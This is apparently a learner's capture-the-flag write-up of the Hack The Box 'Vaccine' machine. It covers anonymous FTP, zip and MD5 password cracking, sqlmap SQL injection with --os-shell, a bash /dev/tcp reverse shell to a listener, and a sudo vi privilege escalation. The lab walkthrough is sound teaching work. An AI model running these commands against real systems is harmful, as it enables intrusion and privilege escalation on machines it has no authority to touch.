---
title: Vaccine
date: 2026-08-02
tags:
  - Linux
  - HTB
category: Linux
socialImage: "images/Vaccine-cover.jpg"
---

### About

Vaccine is a very easy Linux machine that emphasizes **enumeration and password cracking**. Anonymous FTP access exposes a password-protected backup archive which can be cracked to recover web application credentials. These credentials grant access to a PHP application **vulnerable to SQL injection** which leads to **command execution and an initial shell as the postgres user**. Finally, privilege escalation can be achieved by abusing misconfigured sudo permissions on `vi`.

> [!info] Helpful resource
> This YouTube video helped me understand and find the flag while doing the reverse shell.
> https://www.youtube.com/watch?v=xziHmSl1yZQ&t=2216s

![[Vaccine-cover.png]]

----------------------------
>
### Recon

Started with a full service scan:
![[01-namp-recon.png]]
Three services: **FTP, SSH, and HTTP**. The interesting bit was already sitting right there in the scan output: **nmap's `ftp-anon` script** had already logged in anonymously and listed a file called `backup.zip` on the FTP server.

> [!question] Task 1: Besides SSH and HTTP, what other service is hosted on this box?
> 
> > [!success] FTP

> [!question] Task 2: This service can be configured to allow login with any password for a specific username. What is that username?
>
> > [!success] anonymous

&nbsp;

### Getting the file

Anonymous FTP login means the server accepts the username `anonymous` with basically any (or blank) password:
![[02-ftp-anon-download.png]]

> [!question] Task 3: What is the name of the file downloaded over this service?
>
>>  [!success] backup.zip

I was trying to unzip it straight away but it asked for a password, so `backup.zip` is our first real obstacle. It was a protected zip file which it’s kind of new to me of finding a way to crack it opened.

&nbsp;

### Cracking the zip

I know John The Ripper doesn't crack zip files directly, it needs a hash to work against, not the archive itself. That's what `zip2john` is for: **it's a helper script bundled with John that extracts the password-verification data from a protected zip and reformats it into a hash John can actually brute-force.**
![[03-zip2john-hash.png]]
![[04-john-crack-zip.png]]
`741852963` is the password to unzip that file.
![[05-unzip-backup.png]]

> [!question] Task 4: What script comes with the John The Ripper toolset and generates a hash from a password-protected zip archive in a format to allow for cracking attempts?
>
>> [!success] zip2john

&nbsp;

### Cracking the web app password

Opened `index.php` and found the login logic hardcoded right there:
![[06-index-php-source.png]]
So the admin password is stored as an **MD5 hash**. I recognized it as MD5 from two habits I picked up early on:
- it's exactly 32 characters
- it only uses hex characters (0–9, A–F)

  I used https://crackstation.net/

  ![[07-crackstation-result.png]]

**For complicated, unique, or salted hashes**, it's better to use `hashcat`. I used this online cracker instead since the hash was simple enough to solve with it.

```
hashcat -m 0 hash.txt rockyou.txt
```

> [!question] Task 5: What is the password for the admin user on the website?
![[08-login-page.png]]

> [!success] qwerty789

&nbsp;

### Finding and exploiting the SQL injection

After logging in, I landed on `dashboard.php` with a search feature. The search feature is the most suspicious place we can test with sql injection. 

I tested the `search` parameter with a single quote (`'`), and it threw an error message.

![[09-sqli-error.png]]

I handed it to `sqlmap`, first just enumerating databases to prove the injection worked before trying anything riskier:

```html
sqlmap -u "http://10.129.20.56/dashboard.php?search=Sandy" --cookie="PHPSESSID=96qa4k1j0jue4agoqat21rv4vp" --batch --dbs
```

What this command means:
- Test this URL's `search` parameter for SQL injection, using this session cookie to stay authenticated, don't stop to ask me questions along the way, and once you confirm the injection, list out all the databases you can see. --dbsList all database names
- `--cookie` was needed because the app requires an authenticated session. First, I used it to enumerate without using cookie, the result gave me that the website couldn’t be injectable, and I was stuck for awhile wondering what was wrong 🥲

Okay, cool. Based on the result, we learned that the this website use Postgres as db, and is vulnerable to UNION query attack. The method used was **Time-Based Blind SQL injection**, where injected queries cause a delay in the server's response ( Be able to recognize this one as I have just finished SQL Injection course on Portswigger web security ).

![[10-sqlmap-injectable.png]]

> [!question] Task 6: What option can be passed to sqlmap to try to get command execution via the SQL injection?

Because the logged-in user is the admin user, we have admin privilege, so we can use `--os-shell` to get command execution via injection.

```html
sqlmap -u "http://10.129.95.174/dashboard.php?search=Sandy" --cookie="PHPSESSID=..." --batch --os-shell
```

![[11-sqlmap-osshell.png]]

> [!success] --os-shell

&nbsp;

### Turning that into a real shell

To get something more usable, I fired off a reverse shell from inside the `os-shell`:

```bash
bash -c "bash -i >& /dev/tcp/10.10.15.117/4444 0>&1"
```
![[13-reverse-shell-fired.png]]

I didn’t understand at first why we have to do reverse shell since we already got a shell. The idea was not new, it’s just before I was only copied the script from others without trying to understand it. So I was stuck when I encountered it again. The actual thing is:  

> [!info] What `--os-shell` actually is, under the hood
> sqlmap's `--os-shell` **isn't a real shell at all** — it's an illusion built on top of the SQL injection. Every time you type a command at that `os-shell>` prompt, here's what really happens:
>
> 1. sqlmap takes your command
> 2. Wraps it into a SQL injection payload (using something like PostgreSQL's `COPY ... FROM PROGRAM ...`, visible in the screenshot: `[INFO] going to use 'COPY ... FROM PROGRAM ...' command execution`)
> 3. Sends that payload as an **entirely new HTTP request** to the vulnerable page
> 4. The server runs the command, and sqlmap scrapes the output back out of the HTTP response
> 5. This repeats **from scratch for every single command typed**
>
> So it *feels* like a shell because sqlmap gives a shell-like prompt, but underneath there's no persistent process, no open connection, no session state — just repeated one-off HTTP requests, each re-triggering the injection.

![[12-reverse-shell-listener.png]]
We have another terminal open to listen on port 4444 which get us a real reverse shell. This connects a bash process back out to my listener. Once it landed, I had a shell as `postgres`.

&nbsp;

### Grabbing the user flag

![[14-user-flag.png]]
From the upgraded shell, the user's home directory was `/var/lib/postgresql/11/main`, since `postgres` is a **service account**, **Linux convention puts these under `/var/lib/[service]` rather than `/home`**.

&nbsp;

### Finding creds for a proper login

A raw reverse shell isn't the most stable thing to work from, so I went looking for a way to get a cleaner session through **SSH**. I got a clue from walk through 😂 to check the web app's source for hardcoded credentials, since that's a very common (and very bad) practice:

![[15-dashboard-creds.png]]

```
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

The PHP app's PostgreSQL connection string, with the DB password hardcoded directly in the source. Then I used it to login over ssh:

```bash
ssh postgres@10.129.95.174
```

&nbsp;

### Privilege escalation

Actually, I am not really good at this part. I had to look into some walkthrough for clue but not directly looking for the answer. 

Once logged in properly, I checked what I was allowed to run as another user (root):

![[16-sudo-l-output.png]]

We're not fully allowed to run as root, but the line below tells us `postgres` can run `/bin/vi` on this one config file, as **any user** (`ALL`), via sudo.

```bash
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

![[17-vi-shell-escape.png]]

```bash
:set shell=/bin/sh
:shell
```

Via `vi`, we can edit the document as an editor and also execute a command by typing `:` and `Enter`.

Then boom, root privilege.

![[18-root-shell-confirm.png]]

> [!question] Task 7: What program can the postgres user run as root using sudo?
>> [!success] vi


At first I didn’t understand how and why it works. I don’t get this concept. I knew `vi` has a :shell command that drops you into a subshell without closing the editor. **But why would that subshell be root?**

> [!info] The answer
> When you run something with `sudo`, sudo elevates the entire process, not just "permission to touch this one file." So `sudo /bin/vi [file]` means the vi process itself is now running as root. Any child process vi spawns, including a shell launched via `:shell`, inherits the privileges of its parent. Since vi is root, the shell it spawns is root too.

&nbsp;

### Root flag

![[19-root-flag.png]]

&nbsp;

### What I took away from this box

- **Anonymous FTP** is small but can get us the entire way in, always worth testing.
- I get to know new tool which is `zip2john`, used to crack the password on a protected zip file.
- I get to know a little bit more about reverse shell, not entirely understand or get the concept of it just now I know one way to get the reverse shell.
- The `vi` editor surprised me the most with its ability to execute a command and drop into a subshell. Didn't know that was possible, stuck on it for a whole evening 🥲.
- [GTFOBins](https://gtfobins.github.io/) catalogs this exact category of misconfiguration across dozens of common binaries. If you want to learn more, this video is a good watch: https://youtu.be/UiVMwXeO_EY?si=yrdfAjtvOS5nux5I
